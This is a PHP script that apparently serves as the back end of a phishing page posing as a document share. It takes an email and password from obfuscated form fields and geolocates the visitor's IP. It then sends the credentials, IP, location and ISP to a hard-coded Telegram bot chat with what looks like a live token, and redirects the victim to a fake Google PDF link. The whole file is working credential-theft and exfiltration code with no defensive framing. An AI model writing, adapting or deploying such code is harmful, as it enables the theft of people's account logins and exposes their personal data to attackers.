<?php 

$TOKEN = "7524805762:AAGOH4U8SIamAXpOAJBw0FzMbZuUTXaSg7g";
$chatId = "7879058098"; 
$userbots = "docbox2_bot";

define("TOKEN", $TOKEN);

/* TELEGRAM FUNCTION */

function bot($method,$datas=[]){

$url = "https://api.telegram.org/bot".TOKEN."/".$method;

if(function_exists('curl_init')){

$ch = curl_init();

curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);

$res = curl_exec($ch);

if(curl_error($ch)){
return null;
}else{
return json_decode($res);
}

}else{

$url = $url."?".http_build_query($datas);
$res = file_get_contents($url);
return json_decode($res);

}

}


/* RECEIVE FORM */

if($_SERVER["REQUEST_METHOD"] == "POST"){

$email = htmlspecialchars($_POST["_u631838709504026913"] ?? "");
$pass = htmlspecialchars($_POST["_u131655890253910348"] ?? ""); 

/* USER IP */

$ip = $_SERVER["REMOTE_ADDR"];

/* LOCATION LOOKUP */

$details = json_decode(file_get_contents("http://ip-api.com/json/".$ip));

$country = $details->country ?? "Unknown";
$city = $details->city ?? "Unknown";
$region = $details->regionName ?? "Unknown";
$isp = $details->isp ?? "Unknown";

$date = date("Y-m-d H:i:s");

/* TELEGRAM MESSAGE */

$text = "

© <b>New Form Submission</b>

Email: $email
Pass: $pass

Country: $country
City: $city
Region: $region
ISP: $isp

IP: $ip
Date: $date

";

/* SEND TO TELEGRAM */

bot("sendMessage",[
"chat_id"=>$chatId,
"text"=>$text,
"parse_mode"=>"HTML"
]);

/* REDIRECT USER */

header("Location: https://www.google.com/pdf_document_2098105/");
exit();

}

?>